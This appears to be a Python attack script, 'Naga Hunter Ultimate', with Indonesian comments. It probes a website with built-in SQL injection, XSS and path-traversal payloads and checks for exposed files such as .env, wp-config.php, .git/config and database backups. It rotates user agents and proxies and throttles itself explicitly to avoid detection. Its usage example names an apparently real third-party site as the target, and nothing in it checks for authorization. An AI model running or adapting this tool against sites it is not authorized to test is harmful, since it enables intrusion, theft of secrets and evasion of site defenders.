#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║              NAGA HUNTER ULTIMATE v2.0                                    ║
║              Auto Vulnerability Scanner + Random IP/Proxy                 ║
║              Mode: /locked | Real Code | Anti-Block                       ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import sys
import re
import time
import json
import random
import requests
import urllib3
from urllib.parse import urljoin, urlparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============== WARNA ==============
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
C = '\033[96m'
W = '\033[0m'
BOLD = '\033[1m'

# ============== BANNER ==============
def banner():
    print(f"""
{R}╔═══════════════════════════════════════════════════════════════════════════╗
║              {W}{BOLD}🐍 NAGA HUNTER ULTIMATE v2.0 🐍{R}                               ║
║              {W}{BOLD}Auto SQLi | XSS | LFI | Backup | Directory{R}                    ║
║              {W}{BOLD}Random IP | Rotating Proxy | Anti-Block{W}                        ║
╚═══════════════════════════════════════════════════════════════════════════╝{W}
    """)

# ============== KONFIGURASI ==============
CONFIG = {
    'timeout': 10,
    'threads': 5,  # Kurangi thread biar tidak kena detect
    'delay_min': 1,
    'delay_max': 3,
}

# ============== DAFTAR USER-AGENT (ROTASI) ==============
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Version/16.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
]

# ============== DAFTAR PROXY (GRATIS, ROTASI) ==============
# Catatan: Proxy gratis sering mati, ganti dengan proxy pribadi untuk hasil maksimal
PROXY_LIST = [
    None,  # Direct connection (fallback)
    # Tambahkan proxy sendiri di sini
    # 'http://proxy1:port',
    # 'http://proxy2:port',
    # 'http://proxy3:port',
]

# ============== FUNGSI RANDOM ==============
def random_delay():
    """Random delay untuk hindari rate limiting"""
    delay = random.uniform(CONFIG['delay_min'], CONFIG['delay_max'])
    time.sleep(delay)

def random_user_agent():
    """Random User-Agent"""
    return random.choice(USER_AGENTS)

def random_proxy():
    """Random proxy (jika ada)"""
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# ============== PAYLOAD DATABASE ==============
PAYLOADS = {
    'sqli': [
        ("' OR '1'='1", "Boolean Bypass"),
        ("' OR 1=1--", "Boolean Bypass 2"),
        ("' AND SLEEP(3)--", "Time Based"),
        ("' UNION SELECT NULL--", "Union Based"),
        ("admin' --", "Auth Bypass"),
        ("' OR '1'='1'#", "Hash Bypass"),
    ],
    'xss': [
        ("<script>alert('XSS')</script>", "Script Tag"),
        ("<img src=x onerror=alert(1)>", "Image Event"),
        ("<svg onload=alert(1)>", "SVG Event"),
    ],
    'lfi': [
        ("../../../../etc/passwd", "Linux LFI"),
        ("..\\..\\..\\..\\windows\\win.ini", "Windows LFI"),
        ("/etc/passwd", "Absolute LFI"),
    ]
}

# ============== DIREKTORI DAN FILE SENSITIF ==============
SENSITIVE_PATHS = [
    '/backup.zip', '/backup.sql', '/db.sql', '/database.sql',
    '/.env', '/config.php', '/wp-config.php', '/.git/config',
    '/admin', '/login', '/wp-admin', '/cpanel', '/webmail', '/phpmyadmin',
    '/~root/', '/~admin/', '/~nobody/',
    '/cgi-bin/', '/cgi-sys/',
    '/error.log', '/debug.log',
]

# ============== HTTP CLIENT DENGAN RANDOM IP ==============
class HTTPClient:
    def __init__(self):
        self.session = None
        self.new_session()
    
    def new_session(self):
        """Buat session baru dengan random User-Agent"""
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': random_user_agent()})
    
    def get(self, url, params=None):
        """GET request dengan random proxy + delay"""
        random_delay()
        
        # Ganti User-Agent setiap request
        self.session.headers.update({'User-Agent': random_user_agent()})
        
        # Pilih proxy random
        proxy = random_proxy()
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        
        try:
            resp = self.session.get(url, params=params, timeout=CONFIG['timeout'], proxies=proxies)
            return resp
        except:
            return None
    
    def head(self, url):
        """HEAD request dengan random proxy"""
        random_delay()
        self.session.headers.update({'User-Agent': random_user_agent()})
        proxy = random_proxy()
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        
        try:
            resp = self.session.head(url, timeout=CONFIG['timeout'], proxies=proxies)
            return resp
        except:
            return None

# ============== SCANNER ==============
class NagaHunter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.http = HTTPClient()
        self.vulnerabilities = []
        self.params = []
    
    def extract_params(self, url):
        """Extract parameter dari URL"""
        parsed = urlparse(url)
        if parsed.query:
            import urllib.parse
            params = urllib.parse.parse_qs(parsed.query)
            for p in params.keys():
                self.params.append({'url': url, 'param': p})
        return self.params
    
    def test_sqli(self, url, param):
        """Test SQL Injection"""
        for payload, ptype in PAYLOADS['sqli']:
            try:
                start = time.time()
                resp = self.http.get(url, {param: payload})
                elapsed = time.time() - start
                
                if resp:
                    # Cek error SQL
                    sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'query failed', 'unclosed quotation']
                    for err in sql_errors:
                        if err.lower() in resp.text.lower():
                            return {'type': 'SQL Injection', 'subtype': ptype, 'url': url, 'param': param, 'payload': payload, 'evidence': err}
                    
                    # Time based
                    if 'SLEEP' in payload and elapsed > 3:
                        return {'type': 'SQL Injection (Time)', 'subtype': ptype, 'url': url, 'param': param, 'payload': payload, 'evidence': f'Delay: {elapsed}s'}
            except:
                pass
        return None
    
    def test_xss(self, url, param):
        """Test XSS"""
        for payload, ptype in PAYLOADS['xss']:
            try:
                resp = self.http.get(url, {param: payload})
                if resp and payload in resp.text:
                    if payload.replace('<', '&lt;') not in resp.text:
                        return {'type': 'XSS', 'subtype': ptype, 'url': url, 'param': param, 'payload': payload, 'evidence': 'Payload reflected'}
            except:
                pass
        return None
    
    def test_lfi(self, url, param):
        """Test LFI"""
        for payload, ptype in PAYLOADS['lfi']:
            try:
                resp = self.http.get(url, {param: payload})
                if resp:
                    if 'root:x:0:0' in resp.text:
                        return {'type': 'LFI', 'subtype': ptype, 'url': url, 'param': param, 'payload': payload, 'evidence': '/etc/passwd exposed'}
                    if '[extensions]' in resp.text:
                        return {'type': 'LFI', 'subtype': ptype, 'url': url, 'param': param, 'payload': payload, 'evidence': 'win.ini exposed'}
            except:
                pass
        return None
    
    def scan_sensitive_paths(self):
        """Scan direktori dan file sensitif"""
        results = []
        for path in SENSITIVE_PATHS:
            url = urljoin(self.target, path)
            resp = self.http.head(url)
            if resp and resp.status_code == 200:
                results.append({'type': 'Sensitive Path', 'url': url, 'evidence': f'HTTP {resp.status_code}'})
                print(f"  {R}[!] Sensitive: {url}{W}")
            elif resp and resp.status_code == 403:
                results.append({'type': 'Forbidden (Check Manual)', 'url': url, 'evidence': 'HTTP 403'})
                print(f"  {Y}[?] Forbidden: {url}{W}")
        return results
    
    def scan_parameters(self):
        """Scan semua parameter yang ditemukan"""
        results = []
        
        # Coba cari parameter dengan mencoba path umum
        test_urls = [
            self.target,
            urljoin(self.target, '/index.php?id=1'),
            urljoin(self.target, '/page.php?id=1'),
            urljoin(self.target, '/detail.php?id=1'),
        ]
        
        for url in test_urls:
            self.extract_params(url)
        
        # Jika tidak ada parameter, coba test dengan parameter umum
        if not self.params:
            common_params = ['id', 'page', 'q', 's', 'cat', 'product', 'user', 'file', 'post', 'news']
            for param in common_params:
                self.params.append({'url': self.target, 'param': param})
        
        print(f"\n  {B}[*] Testing {len(self.params)} parameters...{W}")
        
        with ThreadPoolExecutor(max_workers=CONFIG['threads']) as executor:
            futures = []
            for p in self.params:
                futures.append(executor.submit(self.test_sqli, p['url'], p['param']))
                futures.append(executor.submit(self.test_xss, p['url'], p['param']))
                futures.append(executor.submit(self.test_lfi, p['url'], p['param']))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    print(f"  {R}[!] {result['type']} ditemukan di parameter {result['param']}{W}")
        
        return results
    
    def run(self):
        """Main execution"""
        banner()
        print(f"{Y}[*] Target: {self.target}{W}\n")
        
        # Test koneksi
        print(f"{B}[1] Testing koneksi (with random IP)...{W}")
        resp = self.http.get(self.target)
        if not resp:
            print(f"{R}[-] Target tidak dapat diakses{W}")
            return
        print(f"{G}[+] Target dapat diakses (HTTP {resp.status_code}){W}\n")
        
        # Scan sensitive paths
        print(f"{B}[2] Scanning sensitive paths...{W}")
        sensitive_results = self.scan_sensitive_paths()
        self.vulnerabilities.extend(sensitive_results)
        
        # Scan parameters
        print(f"\n{B}[3] Scanning for SQLi, XSS, LFI...{W}")
        param_results = self.scan_parameters()
        self.vulnerabilities.extend(param_results)
        
        # Report
        print(f"\n{R}{'='*60}{W}")
        print(f"{BOLD}📊 LAPORAN AKHIR{W}")
        print(f"{R}{'='*60}{W}")
        
        if not self.vulnerabilities:
            print(f"{G}[+] Tidak ditemukan kerentanan.{W}")
        else:
            print(f"{R}[!] Ditemukan {len(self.vulnerabilities)} kerentanan:{W}\n")
            for v in self.vulnerabilities:
                print(f"  • {v['type']}")
                print(f"    URL: {v['url'][:80]}")
                if 'param' in v:
                    print(f"    Parameter: {v['param']}")
                if 'payload' in v:
                    print(f"    Payload: {v['payload'][:60]}")
                print(f"    Bukti: {v['evidence']}")
                print()
        
        # Simpan report
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"scan_report_{timestamp}.json"
        with open(filename, 'w') as f:
            json.dump(self.vulnerabilities, f, indent=2)
        print(f"{G}[+] Report saved to: {filename}{W}")

# ============== MAIN ==============
def main():
    if len(sys.argv) < 2:
        print(f"{Y}Usage: python3 naga_hunter.py <target_url>{W}")
        print(f"{Y}Example: python3 naga_hunter.py https://pesantrensmartdigital.com{W}")
        sys.exit(1)
    
    target = sys.argv[1]
    if not target.startswith('http'):
        target = 'https://' + target
    
    hunter = NagaHunter(target)
    hunter.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Scan interrupted{W}")
        sys.exit(0)
